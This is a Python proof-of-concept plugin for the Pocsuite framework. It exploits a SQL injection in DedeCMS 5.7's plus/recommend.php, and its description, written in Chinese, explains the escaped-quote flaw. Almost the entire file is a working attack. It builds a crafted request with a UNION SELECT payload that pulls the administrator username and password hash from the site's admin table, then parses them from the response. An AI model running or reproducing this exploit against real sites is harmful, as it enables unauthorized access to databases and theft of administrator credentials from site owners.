#!/usr/bin/env python
#!coding: utf-8
import re

from pocsuite.net import req
from pocsuite.poc import POCBase,Output
from pocsuite.utils import register

class Fuckdede(POCBase):
	vulID='3'
	version = '1'
	author = ['fengxuan']
	vulDate = '2016-2-20'
	createDate = '2016-2-20'
	updateDate = '2016-2-20'
	references = ['http://www.evalshell.com', 'http://www.cnseay.com/3714/']
	name = 'dedecms plus/recommend.php 注入漏洞利用EXP'
	appPowerLink = 'http://www.dedecms.cn/'
	appName = 'dedecms'
	appVersion = '5.7'
	vulType = 'SQL Injection'
	desc = '''
           开发人员在修补漏洞的时候只修复了少数的变量而遗漏了其他变量，使其他变量直接
           带入了SQL语句中，可以通过\字符来转义掉一个单引号，逃逸单引号，产生SQL注入。
           此注入为报错注入，可以通过UpdateXML函数进行注入。
    '''
	samples = ['']

	def _verify(self):
		result = {}
		target = self.url + "/plus/recommend.php?action=&aid=1&_FILES[type][tmp_name]=\%27%20or%20mid=@`\%27`%20/*!50000union*//*!50000select*/1,2,3,(select%20CONCAT(0x7c,userid,0x7c,pwd)+from+`%23@__admin`%20limit+0,1),5,6,7,8,9%23@`\%27`+&_FILES[type][name]=1.jpg&_FILES[type][type]=application/octet-stream&_FILES[type][size]=4294"
		response = req.get(target)
		content = response.content
		regex = re.compile('<h2>.*?\|(.*?)</h2>')
		data = regex.search(content)
		if data != None:
			result = {'VerifyInfo':{}}
			result['VerifyInfo']['URL'] = self.url
		return self.parse_result(result)

	def _attack(self):
		result = {}
		target = self.url + "/plus/recommend.php?action=&aid=1&_FILES[type][tmp_name]=\%27%20or%20mid=@`\%27`%20/*!50000union*//*!50000select*/1,2,3,(select%20CONCAT(0x7c,userid,0x7c,pwd)+from+`%23@__admin`%20limit+0,1),5,6,7,8,9%23@`\%27`+&_FILES[type][name]=1.jpg&_FILES[type][type]=application/octet-stream&_FILES[type][size]=4294"
		response = req.get(target)
		content = response.content
		regex = re.compile('<h2>.*?\|(.*?)</h2>')
		data = regex.search(content)
		if data != None:
			string = data.groups()
			result = {'VerifyInfo':{}}
			result['VerifyInfo']['URL'] = self.url
			result['VerifyInfo']['data'] = string
		return self.parse_result(result)

	def parse_result(self, result):
		output = Output(self)

		if result:
			output.success(result)
		else:
			output.fail("Internet Nothing returned")
		return output

register(Fuckdede)








